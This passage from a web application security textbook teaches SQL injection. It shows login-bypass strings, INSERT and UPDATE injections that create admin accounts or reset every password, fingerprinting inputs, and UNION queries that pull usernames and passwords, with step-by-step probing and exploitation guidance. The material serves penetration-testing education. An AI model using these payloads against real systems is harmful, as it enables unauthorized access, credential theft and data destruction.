SELECT * FROM users WHERE username = ‚Äòmarcus‚Äô and password = ‚Äòsecret‚Äô
This query causes the database to check every row within the users table 
and extract each record where the username column has the value marcus and 
the password column has the value secret. If a user‚Äôs details are returned to 
the application, the login attempt is successful, and the application creates an 
authenticated session for that user.
In this situation, an attacker can inject into either the username or the password 
fi eld to modify the query performed by the application and thereby subvert its 
logic. For example, if an attacker knows that the username of the application 
administrator is admin, he can log in as that user by supplying any password 
and the following username:
admin‚Äô--
This causes the application to perform the following query:
SELECT * FROM users WHERE username = ‚Äòadmin‚Äô--‚Äô AND password = ‚Äòfoo‚Äô
Note that the comment sequence (--) causes the remainder of the query to 
be ignored, and so the query executed is equivalent to:
SELECT * FROM users WHERE username = ‚Äòadmin‚Äô
so the password check is bypassed.
TRY IT!
http://mdsec.net/auth/319/
Suppose that the attacker does not know the administrator‚Äôs username. In 
most applications, the fi rst account in the database is an administrative user, 
because this account normally is created manually and then is used to generate 
c09.indd 289 c09.indd 289 8/19/2011 12:09:29 PM 8/19/2011 12:09:29 PM
Stuttard c09.indd V3 - 07/28/2011 Page 290
290 Chapter 9 n Attacking Data Stores
all other accounts via the application. Furthermore, if the query returns the 
details for more than one user, most applications will simply process the fi rst 
user whose details are returned. An attacker can often exploit this behavior to 
log in as the fi rst user in the database by supplying the username:
‚Äò OR 1=1--
This causes the application to perform the query:
SELECT * FROM users WHERE username = ‚Äò‚Äô OR 1=1--‚Äô AND password = ‚Äòfoo‚Äô
Because of the comment symbol, this is equivalent to:
SELECT * FROM users WHERE username = ‚Äò‚Äô OR 1=1
which returns the details of all application users.
NOTE Injecting into an interpreted context to alter application logic is a 
generic attack technique. A corresponding vulnerability could arise in LDAP 
queries, XPath queries, message queue implementations, or indeed any 
custom query language.
HACK STEPS
Injection into interpreted languages is a broad topic, encompassing many 
different kinds of vulnerabilities and potentially affecting every component of 
a web application‚Äôs supporting infrastructure. The detailed steps for detecting 
and exploiting code injection fl aws depend on the language that is being 
targeted and the programming techniques employed by the application‚Äôs 
developers. In every instance, however, the generic approach is as follows:
 1. Supply unexpected syntax that may cause problems within the context of 
the particular interpreted language.
 2. Identify any anomalies in the application‚Äôs response that may indicate the 
presence of a code injection vulnerability.
 3. If any error messages are received, examine these to obtain evidence 
about the problem that occurred on the server.
 4. If necessary, systematically modify your initial input in relevant ways in an 
attempt to confirm or disprove your tentative diagnosis of a vulnerability.
 5. Construct a proof-of-concept test that causes a safe command to be 
executed in a verifiable way, to conclusively prove that an exploitable 
code injection flaw exists.
 6. Exploit the vulnerability by leveraging the functionality of the target 
language and component to achieve your objectives.
c09.indd 290 c09.indd 290 8/19/2011 12:09:29 PM 8/19/2011 12:09:29 PM
Stuttard c09.indd V3 - 07/28/2011 Page 291
 Chapter 9 n Attacking Data Stores 291
Injecting into SQL
Almost every web application employs a database to store the various kinds of 
information it needs to operate. For example, a web application deployed by an 
online retailer might use a database to store the following information:
n User accounts, credentials, and personal information
n Descriptions and prices of goods for sale
n Orders, account statements, and payment details
n The privileges of each user within the application
The means of accessing information within the database is Structured Query 
Language (SQL). SQL can be used to read, update, add, and delete information 
held within the database.
SQL is an interpreted language, and web applications commonly construct 
SQL statements that incorporate user-supplied data. If this is done in an unsafe 
way, the application may be vulnerable to SQL injection. This fl aw is one of the 
most notorious vulnerabilities to have affl icted web applications. In the most 
serious cases, SQL injection can enable an anonymous attacker to read and 
modify all data stored within the database, and even take full control of the 
server on which the database is running.
As awareness of web application security has evolved, SQL injection vulnerabilities have become gradually less widespread and more diffi cult to detect 
and exploit. Many modern applications avoid SQL injection by employing APIs 
that, if properly used, are inherently safe against SQL injection attacks. In these 
circumstances, SQL injection typically occurs in the occasional cases where these 
defense mechanisms cannot be applied. Finding SQL injection is sometimes a 
diffi cult task, requiring perseverance to locate the one or two instances in an 
application where the usual controls have not been applied.
As this trend has developed, methods for fi nding and exploiting SQL injection 
fl aws have evolved, using more subtle indicators of vulnerabilities, and more 
refi ned and powerful exploitation techniques. We will begin by examining 
the most basic cases and then go on to describe the latest techniques for blind 
detection and exploitation.
A wide range of databases are employed to support web applications. Although 
the fundamentals of SQL injection are common to the vast majority of these, there 
are many differences. These range from minor variations in syntax to signifi cant 
divergences in behavior and functionality that can affect the types of attacks you 
can pursue. For reasons of space and sanity, we will restrict our examples to the 
three most common databases you are likely to encounter ‚Äî Oracle, MS-SQL, 
and MySQL. Wherever applicable, we will draw attention to the differences 
between these three platforms. Equipped with the techniques we describe here, 
c09.indd 291 c09.indd 291 8/19/2011 12:09:29 PM 8/19/2011 12:09:29 PM
Stuttard c09.indd V3 - 07/28/2011 Page 292
292 Chapter 9 n Attacking Data Stores
you should be able to identify and exploit SQL injection fl aws against any other 
database by performing some quick additional research.
TIP In many situations, you will fi nd it extremely useful to have access to 
a local installation of the same database that is being used by the application you are targeting. You will often fi nd that you need to tweak a piece of 
syntax, or consult a built-in table or function, to achieve your objectives. The 
responses you receive from the target application will often be incomplete 
or cryptic, requiring some detective work to understand. All of this is much 
easier if you can cross-reference with a fully transparent working version of 
the database in question.
If this is not feasible, a good alternative is to fi nd a suitable interactive 
online environment that you can experiment on, such as the interactive tutorials at SQLzoo.net.
Exploiting a Basic Vulnerability
Consider a web application deployed by a book retailer that enables users to 
search for products by author, title, publisher, and so on. The entire book catalog 
is held within a database, and the application uses SQL queries to retrieve details 
of different books based on the search terms supplied by users.
When a user searches for all books published by Wiley, the application performs the following query:
SELECT author,title,year FROM books WHERE publisher = ‚ÄòWiley‚Äô and 
published=1
This query causes the database to check every row within the books table, 
extract each of the records where the publisher column has the value Wiley and 
published has the value 1, and return the set of all these records. The application 
then processes this record set and presents it to the user within an HTML page.
In this query, the words to the left of the equals sign are SQL keywords and 
the names of tables and columns within the database. This portion of the query 
was constructed by the programmer when the application was created. The 
expression Wiley is supplied by the user, and its signifi cance is as an item of 
data. String data in SQL queries must be encapsulated within single quotation 
marks to separate it from the rest of the query.
Now, consider what happens when a user searches for all books published 
by O‚ÄôReilly. This causes the application to perform the following query:
SELECT author,title,year FROM books WHERE publisher = ‚ÄòO‚ÄôReilly‚Äô and 
published=1
c09.indd 292 c09.indd 292 8/19/2011 12:09:29 PM 8/19/2011 12:09:29 PM
Stuttard c09.indd V3 - 07/28/2011 Page 293
 Chapter 9 n Attacking Data Stores 293
In this case, the query interpreter reaches the string data in the same way as 
before. It parses this data, which is encapsulated within single quotation marks, 
and obtains the value O. It then encounters the expression Reilly‚Äô, which is not 
valid SQL syntax, and therefore generates an error:
Incorrect syntax near ‚ÄòReilly‚Äô.
Server: Msg 105, Level 15, State 1, Line 1
Unclosed quotation mark before the character string ‚Äò
When an application behaves in this way, it is wide open to SQL injection. 
An attacker can supply input containing a quotation mark to terminate the 
string he controls. Then he can write arbitrary SQL to modify the query that 
the developer intended the application to execute. In this situation, for example, 
the attacker can modify the query to return every book in the retailer‚Äôs catalog 
by entering this search term:
Wiley‚Äô OR 1=1--
This causes the application to perform the following query:
SELECT author,title,year FROM books WHERE publisher = ‚ÄòWiley‚Äô OR
 1=1--‚Äô and published=1
This modifi es the WHERE clause of the developer‚Äôs query to add a second 
condition. The database checks every row in the books table and extracts 
each record where the publisher column has the value Wiley or where 1 is 
equal to 1. Because 1 always equals 1, the database returns every record in 
the books table.
The double hyphen in the attacker‚Äôs input is a meaningful expression in SQL 
that tells the query interpreter that the remainder of the line is a comment and 
should be ignored. This trick is extremely useful in some SQL injection attacks, 
because it enables you to ignore the remainder of the query created by the 
application developer. In the example, the application encapsulates the usersupplied string in single quotation marks. Because the attacker has terminated 
the string he controls and injected some additional SQL, he needs to handle the 
trailing quotation mark to avoid a syntax error, as in the O‚ÄôReilly example. He 
achieves this by adding a double hyphen, causing the remainder of the query 
to be treated as a comment. In MySQL, you need to include a space after the 
double hyphen, or use a hash character to specify a comment.
The original query also controlled access to only published books, because 
it specifi ed and published=1. By injecting the comment sequence, the attacker 
has gained unauthorized access by returning details of all books, published or 
otherwise.
c09.indd 293 c09.indd 293 8/19/2011 12:09:29 PM 8/19/2011 12:09:29 PM
Stuttard c09.indd V3 - 07/28/2011 Page 294
294 Chapter 9 n Attacking Data Stores
TIP In some situations, an alternative way to handle the trailing quotation 
mark without using the comment symbol is to ‚Äúbalance the quotes.‚Äù You fi nish the injected input with an item of string data that requires a trailing quote 
to encapsulate it. For example, entering the search term:
Wiley‚Äô OR ‚Äòa‚Äô = ‚Äòa
results in the query:
SELECT author,title,year FROM books WHERE publisher = ‚ÄòWiley‚Äô OR
 ‚Äòa‚Äô=‚Äôa‚Äô and published=1
This is perfectly valid and achieves the same result as the 1 = 1 attack to 
return all books published by Wiley, regardless of whether they have been 
published.
This example shows how application logic can be bypassed, allowing an access 
control fl aw in which the attacker can view all books, not just books matching the allowed fi lter (showing published books). However, we will describe 
shortly how SQL injection fl aws like this can be used to extract arbitrary data 
from different database tables and to escalate privileges within the database 
and the database server. For this reason, any SQL injection vulnerability should 
be regarded as extremely serious, regardless of its precise context within the 
application‚Äôs functionality.
Injecting into Different Statement Types
The SQL language contains a number of verbs that may appear at the beginning 
of statements. Because it is the most commonly used verb, the majority of SQL 
injection vulnerabilities arise within SELECT statements. Indeed, discussions 
about SQL injection often give the impression that the vulnerability occurs only 
in connection with SELECT statements, because the examples used are all of this 
type. However, SQL injection fl aws can exist within any type of statement. You 
need to be aware of some important considerations in relation to each.
Of course, when you are interacting with a remote application, it usually is 
not possible to know in advance what type of statement a given item of user 
input will be processed by. However, you can usually make an educated guess 
based on the type of application function you are dealing with. The most common types of SQL statements and their uses are described here.
SELECT Statements
SELECT statements are used to retrieve information from the database. They are 
frequently employed in functions where the application returns information in 
response to user actions, such as browsing a product catalog, viewing a user‚Äôs 
c09.indd 294 c09.indd 294 8/19/2011 12:09:30 PM 8/19/2011 12:09:30 PM
Stuttard c09.indd V3 - 07/28/2011 Page 295
 Chapter 9 n Attacking Data Stores 295
profi le, or performing a search. They are also often used in login functions where 
user-supplied information is checked against data retrieved from a database.
As in the previous examples, the entry point for SQL injection attacks normally 
is the query‚Äôs WHERE clause. User-supplied items are passed to the database to 
control the scope of the query‚Äôs results. Because the WHERE clause is usually the 
fi nal component of a SELECT statement, this enables the attacker to use the comment symbol to truncate the query to the end of his input without invalidating 
the syntax of the overall query.
Occasionally, SQL injection vulnerabilities occur that affect other parts of the 
SELECT query, such as the ORDER BY clause or the names of tables and columns.
TRY IT!
http://mdsec.net/addressbook/32/
INSERT Statements
INSERT statements are used to create a new row of data within a table. They are 
commonly used when an application adds a new entry to an audit log, creates 
a new user account, or generates a new order.
For example, an application may allow users to self-register, specifying their 
own username and password, and may then insert the details into the users
table with the following statement:
INSERT INTO users (username, password, ID, privs) VALUES (‚Äòdaf‚Äô, 
‚Äòsecret‚Äô, 2248, 1)
If the username or password fi eld is vulnerable to SQL injection, an attacker can 
insert arbitrary data into the table, including his own values for ID and privs.
However, to do so he must ensure that the remainder of the VALUES clause is 
completed gracefully. In particular, it must contain the correct number of data 
items of the correct types. For example, injecting into the username fi eld, the 
attacker can supply the following:
foo‚Äô, ‚Äòbar‚Äô, 9999, 0)--
This creates an account with an ID of 9999 and privs of 0. Assuming that the 
privs fi eld is used to determine account privileges, this may enable the attacker 
to create an administrative user.
In some situations, when working completely blind, injecting into an INSERT
statement may enable an attacker to extract string data from the application. For 
example, the attacker could grab the version string of the database and insert 
this into a fi eld within his own user profi le, which can be displayed back to his 
browser in the normal way.
c09.indd 295 c09.indd 295 8/19/2011 12:09:30 PM 8/19/2011 12:09:30 PM
Stuttard c09.indd V3 - 07/28/2011 Page 296
296 Chapter 9 n Attacking Data Stores
TIP When attempting to inject into an INSERT statement, you may not know 
in advance how many parameters are required, or what their types are. In the 
preceding situation, you can keep adding fi elds to the VALUES clause until the 
desired user account is actually created. For example, when injecting into the 
username fi eld, you could submit the following:
foo‚Äô)--
foo‚Äô, 1)--
foo‚Äô, 1, 1)--
foo‚Äô, 1, 1, 1)--
Because most databases implicitly cast an integer to a string, an integer 
value can be used at each position. In this case the result is an account with 
a username of foo and a password of 1, regardless of which order the other 
fi elds are in.
If you fi nd that the value 1 is still rejected, you can try the value 2000,
which many databases also implicitly cast to date-based data types.
When you have determined the correct number of fi elds following the injection point, on MS-SQL you can add a second arbitrary query and use one of 
the inference-based techniques described later in this chapter.
In Oracle, a subselect query can be issued within an insert query. This 
subselect query can cause a success or failure of the main query, using the 
inference-based techniques described later.
TRY IT!
http://mdsec.net/addressbook/12/
UPDATE Statements
UPDATE statements are used to modify one or more existing rows of data within 
a table. They are often used in functions where a user changes the value of data 
that already exists ‚Äî for example, updating her contact information, changing 
her password, or changing the quantity on a line of an order.
A typical UPDATE statement works much like an INSERT statement, except that 
it usually contains a WHERE clause to tell the database which rows of the table to 
update. For example, when a user changes her password, the application might 
perform the following query:
UPDATE users SET password=‚Äônewsecret‚Äô WHERE user = ‚Äòmarcus‚Äô and password 
= ‚Äòsecret‚Äô
This query in effect verifi es whether the user‚Äôs existing password is correct 
and, if so, updates it with the new value. If the function is vulnerable to SQL 
c09.indd 296 c09.indd 296 8/19/2011 12:09:30 PM 8/19/2011 12:09:30 PM
Stuttard c09.indd V3 - 07/28/2011 Page 297
 Chapter 9 n Attacking Data Stores 297
injection, an attacker can bypass the existing password check and update the 
password of the admin user by entering the following username:
admin‚Äô--
NOTE Probing for SQL injection vulnerabilities in a remote application 
is always potentially dangerous, because you have no way of knowing in 
advance quite what action the application will perform using your crafted 
input. In particular, modifying the WHERE clause in an UPDATE statement can 
cause changes to be made throughout a critical table of the database. For 
example, if the attack just described had instead supplied the username:
admin‚Äô or 1=1--
this would cause the application to execute the query:
UPDATE users SET password=‚Äônewsecret‚Äô WHERE user = ‚Äòadmin‚Äô or 
1=1
This resets the value of every user‚Äôs password, because 1 always equals 1!
Be aware that this risk exists even when you attack an application function that does not appear to update any existing data, such as the main login. 
There have been cases where, following a successful login, the application 
performs various UPDATE queries using the supplied username. This means 
that any attack on the WHERE clause may be replicated in these other statements, potentially wreaking havoc within the profi les of all application users. 
You should ensure that the application owner accepts these unavoidable risks 
before attempting to probe for or exploit any SQL injection fl aws. You should 
also strongly encourage the owner to perform a full database backup before 
you begin testing.
TRY IT!
http://mdsec.net/addressbook/27/
DELETE Statements
DELETE statements are used to delete one or more rows of data within a table, 
such as when users remove an item from their shopping basket or delete a 
delivery address from their personal details.
As with UPDATE statements, a WHERE clause normally is used to tell the database which rows of the table to update. User-supplied data is most likely to be 
incorporated into this clause. Subverting the intended WHERE clause can have 
c09.indd 297 c09.indd 297 8/19/2011 12:09:30 PM 8/19/2011 12:09:30 PM
Stuttard c09.indd V3 - 07/28/2011 Page 298
298 Chapter 9 n Attacking Data Stores
far-reaching effects, so the same caution described for UPDATE statements applies 
to this attack.
Finding SQL Injection Bugs
In the most obvious cases, a SQL injection fl aw may be discovered and conclusively verifi ed by supplying a single item of unexpected input to the application. 
In other cases, bugs may be extremely subtle and may be diffi cult to distinguish 
from other categories of vulnerability or from benign anomalies that do not 
present a security threat. Nevertheless, you can carry out various steps in an 
ordered way to reliably verify the majority of SQL injection fl aws.
NOTE In your application mapping exercises (see Chapter 4), you should have 
identifi ed instances where the application appears to be accessing a back-end 
database. All of these need to be probed for SQL injection fl aws. In fact, absolutely any item of data submitted to the server may be passed to database 
functions in ways that are not evident from the user‚Äôs perspective and may be 
handled in an unsafe manner. Therefore, you need to probe every such item 
for SQL injection vulnerabilities. This includes all URL parameters, cookies, 
items of POST data, and HTTP headers. In all cases, a vulnerability may exist in 
the handling of both the name and value of the relevant parameter.
TIP When you are probing for SQL injection vulnerabilities, be sure to walk 
through to completion any multistage processes in which you submit crafted 
input. Applications frequently gather a collection of data across several 
requests, and they persist this to the database only after the complete set has 
been gathered. In this situation, you will miss many SQL injection vulnerabilities if you only submit crafted data within each individual request and monitor 
the application‚Äôs response to that request.
Injecting into String Data
When user-supplied string data is incorporated into a SQL query, it is encapsulated within single quotation marks. To exploit any SQL injection fl aw, you 
need to break out of these quotation marks.
HACK STEPS
 1. Submit a single quotation mark as the item of data you are targeting. 
Observe whether an error occurs, or whether the result differs from the 
original in any other way. If a detailed database error message is received, 
consult the ‚ÄúSQL Syntax and Error Reference‚Äù section of this chapter to 
understand its meaning.
c09.indd 298 c09.indd 298 8/19/2011 12:09:30 PM 8/19/2011 12:09:30 PM
Stuttard c09.indd V3 - 07/28/2011 Page 299
 Chapter 9 n Attacking Data Stores 299
 2. If an error or other divergent behavior was observed, submit two single 
quotation marks together. Databases use two single quotation marks as 
an escape sequence to represent a literal single quote, so the sequence is 
interpreted as data within the quoted string rather than the closing string 
terminator. If this input causes the error or anomalous behavior to disappear, the application is probably vulnerable to SQL injection.
 3. As a further verification that a bug is present, you can use SQL concatenator characters to construct a string that is equivalent to some benign 
input. If the application handles your crafted input in the same way as it 
does the corresponding benign input, it is likely to be vulnerable. Each 
type of database uses different methods for string concatenation. The 
following examples can be injected to construct input that is equivalent to 
FOO in a vulnerable application:
n Oracle: ‚Äò||‚ÄôFOO
n MS-SQL: ‚Äò+‚ÄôFOO
n MySQL: ‚Äò ‚ÄòFOO (note the space between the two quotes)
TIP One way of confi rming that the application is interacting with a backend database is to submit the SQL wildcard character % in a given parameter. 
For example, submitting this in a search fi eld often returns a large number of 
results, indicating that the input is being passed into a SQL query. Of course, 
this does not necessarily indicate that the application is vulnerable ‚Äî only that 
you should probe further to identify any actual fl aws.
TIP While looking for SQL injection using a single quote, keep an eye 
out for any JavaScript errors occurring when your browser processes the 
returned page. It is fairly common for user-supplied input to be returned 
within JavaScript, and an unsanitized single quote will cause an error in the 
JavaScript interpreter, just as it does in the SQL interpreter. The ability to 
inject arbitrary JavaScript into responses allows cross-site scripting attacks, as 
described in Chapter 12.
Injecting into Numeric Data
When user-supplied numeric data is incorporated into a SQL query, the application may still handle this as string data by encapsulating it within single quotation 
marks. Therefore, you should always follow the steps described previously for string 
data. In most cases, however, numeric data is passed directly to the database in 
numeric form and therefore is not placed within single quotation marks. If none 
of the previous tests points toward the presence of a vulnerability, you can take 
some other specifi c steps in relation to numeric data.
c09.indd 299 c09.indd 299 8/19/2011 12:09:30 PM 8/19/2011 12:09:30 PM
Stuttard c09.indd V3 - 07/28/2011 Page 300
300 Chapter 9 n Attacking Data Stores
HACK STEPS
 1. Try supplying a simple mathematical expression that is equivalent to the 
original numeric value. For example, if the original value is 2, try submitting 1+1 or 3-1. If the application responds in the same way, it may be 
vulnerable.
 2. The preceding test is most reliable in cases where you have confirmed 
that the item being modified has a noticeable effect on the application‚Äôs behavior. For example, if the application uses a numeric PageID
parameter to specify which content should be returned, substituting 1+1 
for 2 with equivalent results is a good sign that SQL injection is present. 
However, if you can place arbitrary input into a numeric parameter without changing the application‚Äôs behavior, the preceding test provides no 
evidence of a vulnerability.
 3. If the first test is successful, you can obtain further evidence of the vulnerability by using more complicated expressions that use SQL-specific keywords 
and syntax. A good example of this is the ASCII command, which returns 
the numeric ASCII code of the supplied character. For example, because the 
ASCII value of A is 65, the following expression is equivalent to 2 in SQL:
67-ASCII(‚ÄòA‚Äô)
 4. The preceding test will not work if single quotes are being filtered. 
However, in this situation you can exploit the fact that databases implicitly convert numeric data to string data where required. Hence, because 
the ASCII value of the character 1 is 49, the following expression is equivalent to 2 in SQL:
51-ASCII(1)
TIP A common mistake when probing an application for defects such as SQL 
injection is to forget that certain characters have special meaning within HTTP 
requests. If you want to include these characters within your attack payloads, 
you must be careful to URL-encode them to ensure that they are interpreted in 
the way you intend. In particular:
n & and = are used to join name/value pairs to create the query string and 
the block of POST data. You should encode them using %26 and %3d,
respectively.
n Literal spaces are not allowed in the query string. If they are submitted, 
they will effectively terminate the entire string. You should encode them 
using + or %20.
n Because + is used to encode spaces, if you want to include an actual +
in your string, you must encode it using %2b. In the previous numeric 
example, therefore, 1+1 should be submitted as 1%2b1.
c09.indd 300 c09.indd 300 8/19/2011 12:09:30 PM 8/19/2011 12:09:30 PM
Stuttard c09.indd V3 - 07/28/2011 Page 301
 Chapter 9 n Attacking Data Stores 301
n The semicolon is used to separate cookie fi elds and should be encoded 
using %3b.
These encodings are necessary whether you are editing the parameter‚Äôs 
value directly from your browser, with an intercepting proxy, or through any 
other means. If you fail to encode problem characters correctly, you may invalidate the entire request or submit data you did not intend to.
The steps just described generally are suffi cient to identify the majority 
of SQL injection vulnerabilities, including many of those where no useful results or 
error information are transmitted back to the browser. In some cases, however, 
more advanced techniques may be necessary, such as the use of time delays 
to confi rm the presence of a vulnerability. We will describe these techniques 
later in this chapter.
Injecting into the Query Structure
If user-supplied data is being inserted into the structure of the SQL query itself, 
rather than an item of data within the query, exploiting SQL injection simply 
involves directly supplying valid SQL syntax. No ‚Äúescaping‚Äù is required to 
break out of any data context.
The most common injection point within the SQL query structure is within an 
ORDER BY clause. The ORDER BY keyword takes a column name or number and 
orders the result set according to the values in that column. This functionality 
is frequently exposed to the user to allow sorting of a table within the browser.
A typical example is a sortable table of books that is retrieved using this query:
SELECT author, title, year FROM books WHERE publisher = ‚ÄòWiley‚Äô ORDER BY 
title ASC
If the column name title in the ORDER BY is specifi ed by the user, it is not 
necessary to use a single quote. The user-supplied data already directly modifi es the structure of the SQL query.
TIP In some rarer cases, user-supplied input may specify a column name 
within a WHERE clause. Because these are also not encapsulated in single 
quotes, a similar issue occurs. The authors have also encountered applications 
where the table name has been a user-supplied parameter. Finally, a surprising number of applications expose the sort order keyword (ASC or DESC) to be 
specifi ed by the user, perhaps believing that this has no consequence for SQL 
injection attacks.
Finding SQL injection in a column name can be diffi cult. If a value is supplied that is not a valid column name, the query results in an error. This means 
that the response will be the same regardless of whether the attacker submits a 
c09.indd 301 c09.indd 301 8/19/2011 12:09:30 PM 8/19/2011 12:09:30 PM
Stuttard c09.indd V3 - 07/28/2011 Page 302
302 Chapter 9 n Attacking Data Stores
path traversal string, single quote, double quote, or any other arbitrary string. 
Therefore, common techniques for both automated fuzzing and manual testing 
are liable to overlook the vulnerability. The standard test strings for numerous 
kinds of vulnerabilities will all cause the same response, which may not itself 
disclose the nature of the error.
NOTE Some conventional SQL injection defenses described later in this 
chapter cannot be implemented for user-specifi ed column names. Using 
prepared statements or escaping single quotes will not prevent this type of 
SQL injection. As a result, this vector is a key one to look out for in modern 
applications.
HACK STEPS
 1. Make a note of any parameters that appear to control the order or field 
types within the results that the application returns.
 2. Make a series of requests supplying a numeric value in the parameter 
value, starting with the number 1 and incrementing it with each subsequent request:
n If changing the number in the input affects the ordering of the results, 
the input is probably being inserted into an ORDER BY clause. In SQL, 
ORDER BY 1 orders by the fi rst column. Increasing this number to 2
should then change the display order of data to order by the second 
column. If the number supplied is greater than the number of columns 
in the result set, the query should fail. In this situation, you can confi rm 
that further SQL can be injected by checking whether the results order 
can be reversed, using the following:
1 ASC --
1 DESC --
n If supplying the number 1 causes a set of results with a column containing a 1 in every row, the input is probably being inserted into the name 
of a column being returned by the query. For example:
SELECT 1,title,year FROM books WHERE publisher=‚ÄôWiley‚Äô
NOTE Exploiting SQL injection in an ORDER BY clause is signifi cantly different from most other cases. A database will not accept a UNION, WHERE, OR, or 
AND keyword at this point in the query. Generally exploitation requires the 
attacker to specify a nested query in place of the parameter, such as replacing the column name with (select 1 where <<condition>> or 1/0=0),
thereby leveraging the inference techniques described later in this chapter. 
For databases that support batched queries such as MS-SQL, this can be the 
most effi cient option.
c09.indd 302 c09.indd 302 8/19/2011 12:09:30 PM 8/19/2011 12:09:30 PM
Stuttard c09.indd V3 - 07/28/2011 Page 303
 Chapter 9 n Attacking Data Stores 303
Fingerprinting the Database
Most of the techniques described so far are effective against all the common 
database platforms, and any divergences have been accommodated through 
minor adjustments to syntax. However, as we begin to look at more advanced 
exploitation techniques, the differences between platforms become more signifi -
cant, and you will increasingly need to know which type of back-end database 
you are dealing with.
You have already seen how you can extract the version string of the major 
database types. Even if this cannot be done for some reason, it is usually possible to fi ngerprint the database using other methods. One of the most reliable 
is the different means by which databases concatenate strings. In a query where 
you control some item of string data, you can supply a particular value in one 
request and then test different methods of concatenation to produce that string. 
When the same results are obtained, you have probably identifi ed the type of 
database being used. The following examples show how the string services
could be constructed on the common types of database:
n Oracle: ‚Äòserv‚Äô||‚Äôices‚Äô
n MS-SQL: ‚Äòserv‚Äô+‚Äôices‚Äô
n MySQL: ‚Äòserv‚Äô ‚Äòices‚Äô (note the space)
If you are injecting into numeric data, the following attack strings can be 
used to fi ngerprint the database. Each of these items evaluates to 0 on the target 
database and generates an error on the other databases:
n Oracle: BITAND(1,1)-BITAND(1,1)
n MS-SQL: @@PACK_RECEIVED-@@PACK_RECEIVED
n MySQL: CONNECTION_ID()-CONNECTION_ID()
NOTE The MS-SQL and Sybase databases share a common origin, so they 
have many similarities in relation to table structure, global variables, and stored 
procedures. In practice, the majority of the attack techniques against MS-SQL 
described in later sections will work in an identical way against Sybase.
A further point of interest when fi ngerprinting databases is how MySQL 
handles certain types of inline comments. If a comment begins with an exclamation point followed by a database version string, the contents of the comment 
are interpreted as actual SQL, provided that the version of the actual database 
is equal to or later than that string. Otherwise, the contents are ignored and 
treated as a comment. Programmers can use this facility much like preprocessor directives in C, enabling them to write different code that will be processed 
c09.indd 303 c09.indd 303 8/19/2011 12:09:30 PM 8/19/2011 12:09:30 PM
Stuttard c09.indd V3 - 07/28/2011 Page 304
304 Chapter 9 n Attacking Data Stores
conditionally upon the database version being used. An attacker also can use this 
facility to fi ngerprint the exact version of the database. For example, injecting 
the following string causes the WHERE clause of a SELECT statement to be false if 
the MySQL version in use is greater than or equal to 3.23.02:
/*!32302 and 1=0*/
The UNION Operator
The UNION operator is used in SQL to combine the results of two or more SELECT
statements into a single result set. When a web application contains a SQL injection vulnerability that occurs in a SELECT statement, you can often employ the 
UNION operator to perform a second, entirely separate query, and combine its 
results with those of the fi rst. If the results of the query are returned to your 
browser, this technique can be used to easily extract arbitrary data from within 
the database. UNION is supported by all major DBMS products. It is the quickest 
way to retrieve arbitrary information from the database in situations where 
query results are returned directly.
Recall the application that enabled users to search for books based on author, 
title, publisher, and other criteria. Searching for books published by Wiley causes 
the application to perform the following query:
SELECT author,title,year FROM books WHERE publisher = ‚ÄòWiley‚Äô
Suppose that this query returns the following set of results:
AUTHOR TITLE YEAR
Litchfi eld The Database Hacker‚Äôs Handbook 2005
Anley The Shellcoder‚Äôs Handbook 2007
You saw earlier how an attacker could supply crafted input to the search 
function to subvert the query‚Äôs WHERE clause and therefore return all the books 
held within the database. A far more interesting attack would be to use the 
UNION operator to inject a second SELECT query and append its results to those 
of the fi rst. This second query can extract data from a different database table. 
For example, entering the search term:
Wiley‚Äô UNION SELECT username,password,uid FROM users--
causes the application to perform the following query:
SELECT author,title,year FROM books WHERE publisher = ‚ÄòWiley‚Äô
UNION SELECT username,password,uid FROM users--‚Äô
c09.indd 304 c09.indd 304 8/19/2011 12:09:30 PM 8/19/2011 12:09:30 PM
Stuttard c09.indd V3 - 07/28/2011 Page 305
 Chapter 9 n Attacking Data Stores 305
This returns the results of the original search followed by the contents of 
the users table:
AUTHOR TITLE YEAR
Litchfi eld The Database Hacker‚Äôs Handbook 2005
Anley The Shellcoder‚Äôs Handbook 2007
admin r00tr0x 0
cliff Reboot 1
NOTE When the results of two or more SELECT queries are combined using 
the UNION operator, the column names of the combined result set are the 
same as those returned by the fi rst SELECT query. As shown in the preceding 
table, usernames appear in the author column, and passwords appear in the 
title column. This means that when the application processes the results 
of the modifi ed query, it has no way of detecting that the data returned has 
originated from a different table.
This simple example demonstrates the potentially huge power of the UNION
operator when employed in a SQL injection attack. However, before it can be 
exploited in this way, two important provisos need to be considered:
n When the results of two queries are combined using the UNION operator, 
the two result sets must have the same structure. In other words, they must 
contain the same number of columns, which have the same or compatible 
data types, appearing in the same order.
n To inject a second query that will return interesting results, the attacker 
needs to know the name of the database table that he wants to target, and 
the names of its relevant columns.
Let‚Äôs look a little deeper at the fi rst of these provisos. Suppose that the attacker 
attempts to inject a second query that returns an incorrect number of columns. 
He supplies this input:
Wiley‚Äô UNION SELECT username,password FROM users--
The original query returns three columns, and the injected query returns 
only two columns. Hence, the database returns the following error:
ORA-01789: query block has incorrect number of result columns
Suppose instead that the attacker attempts to inject a second query whose 
columns have incompatible data types. He supplies this input:
Wiley‚Äô UNION SELECT uid,username,password FROM users--
c09.indd 305 c09.indd 305 8/19/2011 12:09:30 PM 8/19/2011 12:09:30 PM
Stuttard c09.indd V3 - 07/28/2011 Page 306
306 Chapter 9 n Attacking Data Stores
This causes the database to attempt to combine the password column from the 
second query (which contains string data) with the year column from the fi rst 
query (which contains numeric data). Because string data cannot be converted 
into numeric data, this causes an error:
ORA-01790: expression must have same datatype as corresponding expression
NOTE The error messages shown here are for Oracle. The equivalent 
messages for other databases are listed in the later section ‚ÄúSQL Syntax and 
Error Reference.‚Äù
In many real-world cases, the database error messages shown are trapped 
by the application and are not be returned to the user‚Äôs browser. It may appear, 
therefore, that in attempting to discover the structure of the fi rst query, you are 
restricted to pure guesswork. However, this is not the case. Three important 
points mean that your task usually is easy:
n For the injected query to be capable of being combined with the fi rst, it is 
not strictly necessary that it contain the same data types. Rather, they must 
be compatible. In other words, each data type in the second query must 
either be identical to the corresponding type in the fi rst or be implicitly 
convertible to it. You have already seen that databases implicitly convert 
a numeric value to a string value. In fact, the value NULL can be converted 
to any data type. Hence, if you do not know the data type of a particular 
fi eld, you can simply SELECT NULL for that fi eld.
n In cases where the application traps database error messages, you can 
easily determine whether your injected query was executed. If it was, 
additional results are added to those returned by the application from its 
original query. This enables you to work systematically until you discover 
the structure of the query you need to inject.
n In most cases, you can achieve your objectives simply by identifying a 
single fi eld within the original query that has a string data type. This is 
suffi cient for you to inject arbitrary queries that return string-based data 
and retrieve the results, enabling you to systematically extract any desired 
